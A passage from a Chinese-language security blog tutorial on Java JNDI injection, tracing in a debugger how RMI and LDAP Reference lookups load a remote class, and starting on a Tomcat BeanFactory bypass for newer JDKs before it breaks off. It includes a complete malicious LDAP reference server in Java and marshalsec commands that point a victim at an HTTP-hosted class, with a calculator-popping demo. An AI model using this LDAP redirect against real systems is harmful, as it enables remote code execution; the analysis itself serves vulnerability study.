title="客户端查找服务为什么变成了ReferenceWrapper_Stub​"></a>客户端查找服务为什么变成了<code>ReferenceWrapper_Stub</code>​</h3><p>这里我们可以从服务端调试一下<br>绑定的时候肯定没问题就是​<code>Reference</code>​类，那么出问题的地方肯定就是在<code>rebind</code>​那里了<br>下断点跟到​<code>rebind</code>​里调试，一样是一路跟进rebind，直到<code>RegistryContext类</code>​<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205155-250j9cu.png">​​<br>在这一步进行​<code>encodeObject</code>​之前他还是保持<code>Reference</code>​类<br>我们跟到​<code>encodeObject</code>​中去看一下<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205307-u6e8nd0.png">​​<br>可以看到这里检测如果obj是Reference类就爆他包装成ReferenceWrapper类返回<br>接下来我们回头看调用的时候<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205403-yoxgilo.png">​​<br>因为服务端包装的时候encode了，所以客户端解析的时候肯定decode一下，再跟进去看（可以猜到是相反的逻辑）：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205523-d5zj39a.png">​​<br>可以看到是已经又返回成了​<code>Reference</code>​类<br>我们这里可以留意到我们还在​<code>RegistryContext</code>​里面并且即将退出<code>RegistryContext</code>​这个类这个类是<code>RMI</code>​对应这个<code>RegistryContext</code>​，但是还没有初始化，要到<code>NamingManager</code>​类中去。因此这里执行代码的逻辑和容器的环境并没有关系，并不是RMI才独有这个漏洞，这个后续绕过的时候会再次用到这个点。（后面高版本绕过还会提到）<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205719-d4wjcu9.png">​​<br>接下来到静态函数中发现这里会从引用中找到对象工厂，跟进去看他的逻辑<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205738-pubxgt8.png">​​<br>发现直接利用loadClass进行加载，再跟进去看看loadClass的逻辑<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205749-s6x5jn1.png">​​<br>首先​<code>loadClass</code>​要获取类加载器，发现这里的<code>getConetxtClassloader()</code>​获取不到类加载器，于是到下一个<code>loadClass</code>​<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205955-pduo887.png">​​<br>可以看到这里是一个​<code>AppclassLoader</code>​，跟进去<br>发现他使用codebase去获取类加载器：</p><p>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420205908-1yhgi3v.png">​​<br>codebase就是我们传入的http服务<br>​​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420210129-p6a3wyn.png">​​​<br>这里利用了URLClassLoader来加载，那么就可以加载到我们的http服务的类<br>并且这里使用了newInstance，说明这里会对类进行初始化，所以如果我们把恶意代码写道静态代码块中，下一步就可以弹出计算器了，我们执行下一步：<br>​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420210148-c353v8t.png">​<br>可以看到弹出计算器了<br>就是是写在构造函数中的代码也可以得到执行，因为后续代码有​<code>Class.forName(className, true, cl);</code>​设置了true选项，会对类进行实例化，这样子构造函数中的恶意代码也可以得到执行<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420210431-i2ios88.png">​​</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>攻击面有两个方法：</p><pre class=" language-xml"><code class="language-xml">1.原生RMI的漏洞问题2.JNDI独有的引用问题，就是上面的分析流程产生的安全问题[+]我们常说的JDNI注入就是第二个方法（引用）</code></pre><h2 id="版本（8u121"><a href="#版本（8u121" class="headerlink" title="版本（8u121&lt;jdk&lt;8u191）​绕过"></a>版本<code>（8u121&lt;jdk&lt;8u191）</code>​绕过</h2><p>客户端还是很简单：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">,</span> RemoteException <span class="token punctuation">{</span>        InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IRemoteObj remoteObj <span class="token operator">=</span> <span class="token punctuation">(</span>IRemoteObj<span class="token punctuation">)</span> initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://localhost:8888/TestRef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//8u141</span></code></pre><p>环境先搭好，8u121之前就只剩下一个LDAP方式可以利用攻击了，所以要有一个LDAP服务器<br>推荐两种方式：</p><ol><li>直接用Java代码生成一个，本地运行</li></ol><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ServerSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>SocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span>SSLSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServer<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryListenerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryInterceptedSearchResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>InMemoryOperationInterceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>Entry<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>LDAPResult<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span>ResultCode<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPRefServer</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LDAP_BASE <span class="token operator">=</span> <span class="token string">"dc=example,dc=com"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> tmp_args <span class="token punctuation">)</span> <span class="token punctuation">{</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"http://192.168.43.88/#test"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token number">7777</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InMemoryDirectoryServerConfig config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span>LDAP_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>                    <span class="token string">"listen"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>                    InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>                    port<span class="token punctuation">,</span>                    ServerSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    SocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>SSLSocketFactory<span class="token punctuation">)</span> SSLSocketFactory<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            InMemoryDirectoryServer ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Listening on 0.0.0.0:"</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e <span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> URL codebase<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">OperationInterceptor</span> <span class="token punctuation">(</span> URL cb <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>codebase <span class="token operator">=</span> cb<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result <span class="token punctuation">)</span> <span class="token punctuation">{</span>            String base <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Entry e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">sendResult</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> base<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span> Exception e1 <span class="token punctuation">)</span> <span class="token punctuation">{</span>                e1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">sendResult</span> <span class="token punctuation">(</span> InMemoryInterceptedSearchResult result<span class="token punctuation">,</span> String base<span class="token punctuation">,</span> Entry e <span class="token punctuation">)</span> <span class="token keyword">throws</span> LDAPException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>            URL turl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">".class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Send LDAP reference result for "</span> <span class="token operator">+</span> base <span class="token operator">+</span> <span class="token string">" redirecting to "</span> <span class="token operator">+</span> turl<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String cbstring <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> refPos <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>                cbstring <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> refPos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaCodeBase"</span><span class="token punctuation">,</span> cbstring<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"objectClass"</span><span class="token punctuation">,</span> <span class="token string">"javaNamingReference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$NON-NLS-1$</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaFactory"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> ResultCode<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//记得添加依赖：</span><span class="token comment" spellcheck="true">/*&lt;dependency>    &lt;groupId>com.unboundid&lt;/groupId>    &lt;artifactId>unboundid-ldapsdk&lt;/artifactId>    &lt;version>3.1.1&lt;/version>&lt;/dependency>*/</span></code></pre><ol start="2"><li>用github上的项目<br>这里就用github上的项目了<br><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a><br>在本地打包成jar包之后就可以运行了<br>打包完之后进入target项目，运行命令：</li></ol><pre class=" language-bash"><code class="language-bash">java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token punctuation">[</span>http://localhost:9999/<span class="token comment" spellcheck="true">#TestRef](http://localhost:9999/#TestRef) 8888</span></code></pre><p>这样子就算在本地起了一个LDAP服务了<br>含义：</p><pre class=" language-xml"><code class="language-xml">监听8888端口，当接收到ldap请求后，会去​[http://localhost](http://localhost:80):9999这个服务下寻找TestRef.class</code></pre><h2 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h2><h3 id="流程演示"><a href="#流程演示" class="headerlink" title="流程演示"></a>流程演示</h3><p>1.首先本地在恶意类这里开一个http服务，让LDAP接收<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/3.png">​​<br>2.然后把LDAP服务开起来：</p><pre class=" language-bash"><code class="language-bash">java -jar .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token punctuation">[</span>http://localhost:9999/<span class="token comment" spellcheck="true">#TestRef](http://localhost:9999/#TestRef) 8888</span></code></pre><p>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/4.png">​​<br>如果接收到http服务，这里会显示​<code>Listening on 0.0.0.0:8888</code>​<br>运行效果：(8u141)<br>​​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420210922-zd6tblv.png">​​​</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>在​<code>lookup</code>​这里下个断点进去找<br>前面都一路跟着​<code>lookup</code>​，一直到<code>c_lookup</code>​进入到<code>类ldapctx</code>​里面<br>进入到一处：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Obj<span class="token punctuation">.</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>Obj<span class="token punctuation">.</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// serialized object or object reference</span>                obj <span class="token operator">=</span> Obj<span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span>attrs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>这里会获取ldap的属性，进入decodeObject，看一下他解析的逻辑：</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> codebases <span class="token operator">=</span> <span class="token function">getCodebases</span><span class="token punctuation">(</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>CODEBASE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>SERIALIZED_DATA<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ClassLoader cl <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">getURLClassLoader</span><span class="token punctuation">(</span>codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token function">deserializeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>attr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cl<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>REMOTE_LOC<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// For backward compatibility only</span>                <span class="token keyword">return</span> <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span>                    <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>CLASSNAME<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>String<span class="token punctuation">)</span>attr<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            attr <span class="token operator">=</span> attrs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span>OBJECT_CLASS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>attr <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span>                <span class="token punctuation">(</span>attr<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES<span class="token punctuation">[</span>REF_OBJECT<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span>                    attr<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES_LOWER<span class="token punctuation">[</span>REF_OBJECT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">decodeReference</span><span class="token punctuation">(</span>attrs<span class="token punctuation">,</span> codebases<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            NamingException ne <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ne<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> ne<span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>我们知道JNDI支持：</p><ul><li>序列化对象  –&gt;  对应<code>deserializeObject((byte[])attr.get(), cl);</code>​</li><li>远程对象     –&gt;  对应<code>decodeRmiObject((String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),(String)attr.get(), codebases);</code>​</li><li>ldap对象      –&gt; 对应<code>decodeReference(attrs, codebases);</code>​<br>这里因为我们是一个引用对象，所以他会走到​<code>decodeReference(attrs, codebases);</code>​<br>在​<code>decodeReference</code>​这个里面呢主要就是获取恶意类的类名，地址之类的，解析完成：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211053-jlru3o4.png">​​<br>现在有类名，地址，那么就是查找远程恶意类了<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211224-cci6pu0.png">​​<br>一直走到这个地方，这里是执行​<code>DirectoryManager.getObjectInstance</code>​。上次调试原生JNDI攻击的时候是调用的<code>NamingManager.getObjectInstace</code>​，都是这样通过调用<code>getObjectInstance</code>​方法走出自己类所对应的<code>Context类</code>​<br>然后走到工厂引用里面去找类：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211258-ma4sune.png">​​<br>后面的流程就都一样了<br>loadclass：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211308-cb51uc9.png">​​<br>使用URLLoadClass：<br>​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211408-ji2u4mm.png">​​<br>接下来forname实例化：<br>​​​<img src="/Blogimages/JNDI%E6%B3%A8%E5%85%A5/image-20230420211604-obywxjy.png">​​​<br>这个流程就和之前分析的一样了</li></ul><h2 id="高版本绕过（JDK-8u191）"><a href="#高版本绕过（JDK-8u191）" class="headerlink" title="高版本绕过（JDK&gt;8u191）"></a>高版本绕过（JDK&gt;8u191）</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在8u191之后在LDAP那里也加了一个trustURLCodebase的判断，因此LDAP这一条路也被封死了。<br>因此现在LDAP、RMI等攻击手法都被封锁了。我们想要从远程加载类就变得异常困难，我们可以重新看一下代码的逻辑：<br>从本地尝试加载类-&gt;加载不到则从远程加载类<br>那么无法从远程加载类，是否可以从本机尝试加载这个类，并达到RCE的目的呢？<br>答案是有的，不过对客户端的环境有所需求,不过其实这个条件也不算是特别苛刻。因为这里用到的是tomcat内置的包，现在比较主流的Java网站不少都是使用springboot搭建的，而springboot内置的就是Tomcat</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>先来看一下关键先生：BeanFactory类 这个类就是可以利用的恶意类<br>这个类实现了ObjectFactory接口，ObjectFactory接口里面只有一个抽象方法：getObjectInstance</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="恶意类需满足的条件"><a href="#恶意类需满足的条件" class="headerlink" title="恶意类需满足的条件"></a>恶意类需满足的条件</h3><p>只要远程加载地址​<code>factoryClassLocation</code>​为null时<code>NamingManager.getObjectInstance</code>​ 这个代码就会在<code>com.sun.jndi.rmi.registry.RegistryContext.java</code>​中运行<br>因为​<code>RegistryContext</code>​是RMI对应的利用类即利用RMI且不加载远程地址就会执行这个利用链。而<code>NamingManager.getObjectInstance </code>​又会执行<code>getObjectFactoryFromReference</code>​<br>​<code>getObjectFactoryFromReference 